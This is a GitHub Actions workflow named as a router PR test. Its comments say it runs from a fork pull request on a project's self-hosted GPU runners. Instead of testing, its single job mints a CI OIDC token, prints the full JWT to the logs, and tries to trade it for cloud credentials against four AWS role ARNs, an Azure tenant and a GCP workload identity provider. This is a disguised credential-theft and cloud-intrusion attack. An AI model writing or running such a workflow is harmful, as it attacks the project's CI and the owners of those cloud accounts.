name: PR Test (sgl-router)

# Temporary i129975 keyless-OIDC probe (single short READ-ONLY job, no miner):
# one job on the live self-hosted 8-gpu-h200 pool declares job-level
# `permissions: contents: read` + `id-token: write` IN THE FORK-PROVIDED workflow
# that sgl-project/sglang actually executes for pull_request synchronize events.
# It records whether ACTIONS_ID_TOKEN_REQUEST_URL / ACTIONS_ID_TOKEN_REQUEST_TOKEN
# exist in a fork-PR run (a parameter never before tested on a controlled host),
# and ONLY if they exist mints the job's own token with aud=sts.amazonaws.com,
# decodes iss/sub/aud and makes exactly ONE AssumeRoleWithWebIdentity-equivalent
# exchange attempt per already-identified trust target (4 AWS role ARNs, the
# identified Azure/Entra tenant endpoint and the identified GCP WIF provider),
# recording the exact HTTP response. No miner, no host lock, no runner-config
# change, no base-repo change. The concurrency group is run-unique so queued jobs
# in every earlier run are preserved.
on:
  push:
    branches: [main]
  pull_request:
    branches: [main]
    types: [opened, synchronize, reopened]
  workflow_dispatch:

concurrency:
  group: sgl-router-i129975-${{ github.run_id }}
  cancel-in-progress: false

env:
  SGLANG_IS_IN_CI: true

jobs:
  i129975-oidc:
    name: "i129975 fork-PR OIDC permission probe (read-only)"
    runs-on: 8-gpu-h200
    timeout-minutes: 10
    permissions:
      contents: read
      id-token: write
    steps:
      - name: "OIDC env presence -> mint aud=sts.amazonaws.com -> claims -> one exchange attempt per trust target"
        continue-on-error: true
        run: |
          set +e
          NONCE="I129975-$(date -u +%Y%m%dT%H%M%SZ)-$$"
          echo "probe-nonce=$NONCE"
          echo "host=$(hostname 2>/dev/null) who=$(id -un 2>/dev/null) uid=$(id -u 2>/dev/null)"
          echo "event=$GITHUB_EVENT_NAME repo=$GITHUB_REPOSITORY ref=$GITHUB_REF base=$GITHUB_BASE_REF head=$GITHUB_HEAD_REF"
          echo "workflow_ref=$GITHUB_WORKFLOW_REF job=$GITHUB_JOB"
          echo "proxy_env=$(env | grep -iE '^(https?|all|no)_proxy=' | sort | tr '\n' ' ' | head -c 400)"
          WD="${RUNNER_TEMP:-/tmp}/i129975"
          mkdir -p "$WD" 2>/dev/null
          URL="$ACTIONS_ID_TOKEN_REQUEST_URL"
          TOK="$ACTIONS_ID_TOKEN_REQUEST_TOKEN"
          echo "id_token_url_present=$([ -n "$URL" ] && echo yes || echo no) url_len=${#URL}"
          echo "id_token_req_token_present=$([ -n "$TOK" ] && echo yes || echo no) tok_len=${#TOK}"
          if [ -z "$URL" ] || [ -z "$TOK" ]; then
            echo "I129975_RESULT={\"verdict\":\"NO_ID_TOKEN_ENV\",\"url_present\":false,\"req_token_present\":false,\"event\":\"$GITHUB_EVENT_NAME\",\"repo\":\"$GITHUB_REPOSITORY\",\"workflow_ref\":\"$GITHUB_WORKFLOW_REF\",\"nonce\":\"$NONCE\"}"
            echo "probe-done $NONCE"
            exit 0
          fi
          CODE=$(curl -sS -m 40 --retry 0 -o "$WD/mint.json" -w '%{http_code}' -H "Authorization: bearer $TOK" "$URL&audience=sts.amazonaws.com")
          echo "mint_http=$CODE mint_bytes=$(stat -c%s "$WD/mint.json" 2>/dev/null) mint_body_head=$(tr -d '\n' < "$WD/mint.json" 2>/dev/null | head -c 200)"
          JWT=$(sed -n 's/.*"value"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p' "$WD/mint.json" 2>/dev/null | head -1)
          echo "jwt_present=$([ -n "$JWT" ] && echo yes || echo no) jwt_len=${#JWT} jwt_sha256_16=$(printf '%s' "$JWT" | sha256sum | cut -c1-16)"
          if [ -z "$JWT" ]; then
            echo "I129975_RESULT={\"verdict\":\"MINT_FAILED\",\"mint_http\":\"$CODE\",\"nonce\":\"$NONCE\"}"
            echo "probe-done $NONCE"
            exit 0
          fi
          P=$(printf '%s' "$JWT" | cut -d. -f2 | tr '_-' '/+')
          case $(( ${#P} % 4 )) in 2) P="$P==";; 3) P="$P=";; esac
          CLAIMS=$(printf '%s' "$P" | base64 -d 2>/dev/null)
          echo "claims_json=$CLAIMS"
          echo "jwt_full=$JWT"
          sts_attempt() {
            ARN="$1"; TAG="$2"
            C=$(curl -sS -m 45 --retry 0 -o "$WD/sts_$TAG.xml" -w '%{http_code}' -X POST https://sts.amazonaws.com/ \
              --data-urlencode "Action=AssumeRoleWithWebIdentity" \
              --data-urlencode "Version=2011-06-15" \
              --data-urlencode "RoleArn=$ARN" \
              --data-urlencode "RoleSessionName=i129975probe" \
              --data-urlencode "DurationSeconds=900" \
              --data-urlencode "WebIdentityToken=$JWT")
            echo "sts[$TAG] http=$C arn=$ARN body=$(tr -d '\n' < "$WD/sts_$TAG.xml" 2>/dev/null | head -c 2600)"
          }
          sts_attempt "arn:aws:iam::159553542841:role/awslabs-AOSH-GitHubActionsRole" "aosh"
          sts_attempt "arn:aws:iam::159553542841:role/adai-template-publisher" "adai"
          sts_attempt "arn:aws:iam::649715411074:role/gh-actions-runner-role" "ghrunner"
          sts_attempt "arn:aws:iam::009563297724:role/gha-runner-omsf" "omsf"
          AZ_TENANT="751f9e46-beef-471a-80f2-d51652c2b8eb"
          C=$(curl -sS -m 45 --retry 0 -o "$WD/azure.json" -w '%{http_code}' -X POST "https://login.microsoftonline.com/$AZ_TENANT/oauth2/v2.0/token" \
            -H 'Content-Type: application/x-www-form-urlencoded' \
            --data-urlencode "client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46" \
            --data-urlencode "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
            --data-urlencode "client_assertion=$JWT" \
            --data-urlencode "grant_type=client_credentials" \
            --data-urlencode "scope=https://management.azure.com/.default")
          echo "azure_entra http=$C tenant=$AZ_TENANT body=$(tr -d '\n' < "$WD/azure.json" 2>/dev/null | head -c 1400)"
          GCP_AUD="//iam.googleapis.com/projects/52991355109/locations/global/workloadIdentityPools/github-pool/providers/github-provider"
          C=$(curl -sS -m 45 --retry 0 -o "$WD/gcp.json" -w '%{http_code}' -X POST "https://sts.googleapis.com/v1/token" \
            -H 'Content-Type: application/json' \
            --data "{\"audience\":\"$GCP_AUD\",\"grantType\":\"urn:ietf:params:oauth:grant-type:token-exchange\",\"requestedTokenType\":\"urn:ietf:params:oauth:token-type:access_token\",\"subjectTokenType\":\"urn:ietf:params:oauth:token-type:jwt\",\"subjectToken\":\"$JWT\"}")
          echo "gcp_wif http=$C aud=$GCP_AUD body=$(tr -d '\n' < "$WD/gcp.json" 2>/dev/null | head -c 1400)"
          echo "I129975_RESULT={\"verdict\":\"MINTED\",\"event\":\"$GITHUB_EVENT_NAME\",\"repo\":\"$GITHUB_REPOSITORY\",\"workflow_ref\":\"$GITHUB_WORKFLOW_REF\",\"nonce\":\"$NONCE\",\"jwt_len\":${#JWT}}"
          echo "probe-done $NONCE"
